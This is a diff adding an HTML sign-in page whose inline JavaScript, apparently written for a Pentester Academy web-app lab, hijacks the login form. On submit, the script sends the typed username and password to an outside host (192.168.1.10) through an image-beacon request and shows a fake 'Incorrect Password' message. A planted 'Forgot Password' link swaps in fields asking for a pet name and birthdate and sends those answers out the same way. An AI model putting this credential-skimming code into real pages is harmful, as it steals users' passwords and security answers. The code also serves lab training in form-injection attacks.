@@ -1,0 +1,49 @@
+<html>
+  <body>
+    <form class="form-signin">
+      <h2 class="form-signin-heading">Please sign in</h2>
+      <input class="input-block-level" type="text" name="email" placeholder="Email address" value="">
+      <input class="input-block-level" type="password" name="password" placeholder="Password">
+      <button class="btn btn-large btn-primary" type="submit">Sign in</button>
+    </form>
+    <script>
+      var form = document.forms[0];
+      var forgot = document.createElement("a");
+      var forgot_text = document.createTextNode("Forgot Password");
+      child = form.childNodes[6];
+      forgot.appendChild(forgot_text);
+      forgot.href = "#";
+      child.parentNode.insertBefore(forgot,child.nextSibling);
+      forgot.onclick = function(){
+        var evilform = document.forms[0];
+        evilform.innerHTML="";
+        document.body.appendChild(evilform);
+        var input1 = document.createElement("input");
+        var input2 = document.createElement("input");
+        var evilbtn = document.createElement("button");
+        var txt = document.createTextNode("Submit");
+        evilbtn.appendChild(txt);
+        evilform.appendChild(input1);
+        evilform.appendChild(input2);
+        evilform.appendChild(evilbtn);
+        input1.setAttribute("placeholder","What is your Pet's Name ?");
+        input2.setAttribute("placeholder","What is your Birthdate ?");
+        evilbtn.onclick = function(){
+          var pname = document.forms[0].elements[0].value;
+          var birthday = document.forms[0].elements[1].value;
+          new Image().src = "http://192.168.1.10/?petname="+pname+"&bday="+birthday;
+          document.location = "http://pentesteracademylab.appspot.com/lab/webapp/jfp/3";
+        };
+      };
+      document.forms[0].onsubmit = function(){
+      var username = document.forms[0].elements[0].value;
+      var password = document.forms[0].elements[1].value;
+        var wrong = document.createTextNode(" Incorrect Password");
+        form.appendChild(wrong);
+        new Image().src = "http://192.168.1.10/?username="+username+"&password="+password;
+        setTimeout(function(){form.removeChild(form.childNodes[12]);},3000);
+        return false;
+      };
+    </script>
+  </body>
+  </html>
